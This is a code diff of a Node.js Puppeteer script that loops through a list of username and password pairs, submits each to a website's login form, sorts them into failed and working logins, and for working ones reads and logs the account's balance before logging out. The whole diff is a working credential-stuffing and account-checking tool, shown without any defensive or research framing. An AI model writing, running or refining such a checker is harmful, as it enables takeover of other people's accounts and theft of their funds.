@@ -35,63 +35,47 @@ async function main(){
 	  	let newPass = accounts[i].password.split("\r\n")
 	  	let password = newPass[0]
 	  	
-	  	// check accounts
-	  	let data = await check(page, username, password)
-	  	console.log(data)
-	  }
-	  
-  
-};
-
-async function check(page, username, password){
-	return new Promise(async (resolve, reject) => {
-
+		  // check accounts
+		await page.reload()
 		await page.type('input[name=username]', username)
 		await page.type('input[name=password]', password)
 		await page.click('.btn-primary')
 
 		await page.waitForTimeout(2000)
 
-		if(await page.$(".alert")){
-			resolve({
-				found:0,
-				balance:0,
+
+		let alert = await page.evaluate(() => {
+			let el = document.querySelector(".alert")
+			return el ? el.innerText : ""
+		  })
+
+		if(alert.includes("Invalid")){
+			console.log({
+				username,
+				password,
 				msg:'incorrect'
 			})
 		}else{
-			resolve({
-				found:0,
-				balance:0,
-				msg:'correct'
-			})
+				await page.waitForTimeout(3000)
+				await page.waitForSelector(".ml-auto")
+				await page.click(".ml-auto")
+				const element = await page.$("#user_balance");
+	    		const text = await page.evaluate(element => element.textContent, element);
+	    		
+				console.log({
+					username:username,
+					password:password,
+					balance:text
+				})
+
+				await page.click('#topNavbar > ul.navbar-nav.ml-auto > li > div > div > div > div > a:nth-child(6)')
+				await page.waitForTimeout(2000)
 		}
+		  
+	  }
+	  
+  
+};
 
-
-
-
-
-			//   try{
-			//   	await page.waitForSelector("#dropdown04")
-			// 	await page.click("#dropdown04")
-			// 	const element = await page.$("#user_balance");
-	  //   		const text = await page.evaluate(element => element.textContent, element);
-	  //   		await page.click('#topNavbar > ul.navbar-nav.ml-auto > li > div > div > div > div > a:nth-child(6)')
-			// 	resolve({
-			// 		username:username,
-			// 		password:password,
-			// 		found:1,
-			// 		balance:text
-			// 	})
-			// }catch(err){
-			// 	reject({
-			// 		found:0,
-			// 		balance:0
-			// 	})
-			// }
-		
-
-
-	})
-}
 
 main()
